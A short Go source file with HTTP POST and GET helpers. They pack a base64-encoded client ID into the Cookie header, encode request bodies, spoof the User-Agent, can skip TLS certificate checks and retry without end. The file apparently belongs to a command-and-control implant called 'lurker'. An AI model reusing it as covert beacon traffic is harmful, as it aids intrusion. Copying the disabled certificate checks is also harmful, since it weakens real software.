package transports

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"net/http"
	"time"

	"lurker/lurker/constants"

	"github.com/imroc/req"
)

var (
	httpRequest = req.New()
)

func init() {
	httpRequest.SetTimeout(constants.TimeOut * time.Second)
	trans, _ := httpRequest.Client().Transport.(*http.Transport)
	trans.MaxIdleConns = 20
	trans.TLSHandshakeTimeout = constants.TimeOut * time.Second
	trans.DisableKeepAlives = true
	trans.TLSClientConfig = &tls.Config{InsecureSkipVerify: constants.IgnoreSSLCertErrors}
}

func HttpPost(url string, clientID string, data []byte) *req.Resp {
	for {
		if constants.UseProxy {
			httpRequest.SetProxyUrl(constants.Proxy)
		}
		httpHeaders := req.Header{
			"User-Agent": constants.UserAgent,
			"Cookie":     base64.RawURLEncoding.EncodeToString([]byte(clientID)),
		}
		resp, err := httpRequest.Post(url, base64.URLEncoding.EncodeToString([]byte(data)), httpHeaders)
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(constants.SleepTime)
			continue
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				return resp
			}
			break
		}
	}

	return nil
}

func HttpGet(url string, cookies string) *req.Resp {
	httpHeaders := req.Header{
		"User-Agent": constants.UserAgent,
		"Cookie":     cookies,
	}
	for {
		if constants.UseProxy {
			httpRequest.SetProxyUrl(constants.Proxy)
		}
		resp, err := httpRequest.Get(url, httpHeaders)
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(constants.SleepTime)
			continue
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				return resp
			}
			break
		}
	}
	return nil
}
